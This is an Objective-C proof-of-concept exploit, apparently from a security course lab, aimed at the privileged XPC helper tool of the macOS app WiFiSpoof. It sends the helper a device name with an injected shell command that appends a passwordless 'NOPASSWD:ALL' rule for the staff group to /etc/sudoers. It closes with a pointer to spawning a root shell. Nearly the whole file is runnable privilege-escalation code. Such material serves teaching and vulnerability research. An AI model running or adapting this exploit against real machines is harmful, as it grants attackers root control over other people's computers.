/*
 * Reference POC — privileged helper XPC + Authorization (course lab reproduction).
 * Target: vulnerable WiFiSpoof HelperTool + matching app authorization right.
 * Run from a directory authd can read (NOT ~/Downloads) or AuthorizationCreate may fail.
 *
 * Build: gcc -framework Foundation -framework Security wifispoofexp.m -o wifispoofexp
 */

#import <Foundation/Foundation.h>
#import <Security/Security.h>

static NSString *XPCHelperMachServiceName = @"com.sweetpproductions.WiFiSpoofHelperTool";

@protocol HelperToolProtocol
- (void)changeAddressOfDevice:(NSString *)arg1
                  toAddress:(NSString *)arg2
               deviceIsWiFi:(BOOL)arg3
              authorization:(NSData *)arg4
                   withReply:(void (^)(NSError *))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end

int main(void)
{
	@autoreleasepool {
		NSData *authorization = nil;
		OSStatus err;
		AuthorizationExternalForm extForm;
		AuthorizationRef authref = {0};

		/* Command injection: device string becomes part of a bash -c one-liner in helper */
		NSString *device =
		    @"junk; echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers ;";
		NSString *toaddress = @"junk";
		BOOL deviceIsWiFi = NO;

		err = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment,
		    kAuthorizationFlagDefaults, &authref);
		const char *str =
		    CFStringGetCStringPtr(SecCopyErrorMessageString(err, NULL), kCFStringEncodingUTF8);
		NSLog(@"[i] AuthorizationCreate OSStatus: %s", str ? str : "(null)");
		if (err == errAuthorizationSuccess) {
			err = AuthorizationMakeExternalForm(authref, &extForm);
			str = CFStringGetCStringPtr(SecCopyErrorMessageString(err, NULL),
			    kCFStringEncodingUTF8);
			NSLog(@"[i] AuthorizationMakeExternalForm OSStatus: %s", str ? str : "(null)");
		}
		if (err == errAuthorizationSuccess) {
			authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
			str = CFStringGetCStringPtr(SecCopyErrorMessageString(err, NULL),
			    kCFStringEncodingUTF8);
		}
		assert(err == errAuthorizationSuccess);

		NSString *service_name = XPCHelperMachServiceName;

		/* 0x1000 == NSXPCConnectionPrivileged — connect to launchd-managed helper */
		NSXPCConnection *connection =
		    [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];

		NSXPCInterface *interface =
		    [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
		[connection setRemoteObjectInterface:interface];
		[connection resume];

		id obj = [connection
		    remoteObjectProxyWithErrorHandler:^(NSError *error) {
			    NSLog(@"[-] Something went wrong");
			    NSLog(@"[-] Error: %@", error);
		    }];

		NSLog(@"[i] obj: %@", obj);
		NSLog(@"[i] connection: %@", connection);

		[obj changeAddressOfDevice:device
		                 toAddress:toaddress
		              deviceIsWiFi:deviceIsWiFi
		             authorization:authorization
		                  withReply:^(NSError *err) {
			                  NSLog(@"[i] XPC Reply: %@", err);
		                  }];

		/* Allow helper to finish before auth external form is torn down */
		[NSThread sleepForTimeInterval:2.0f];

		NSLog(@"[+] Next: verify sudoers / spawn root shell per class policy");
	}
	return 0;
}
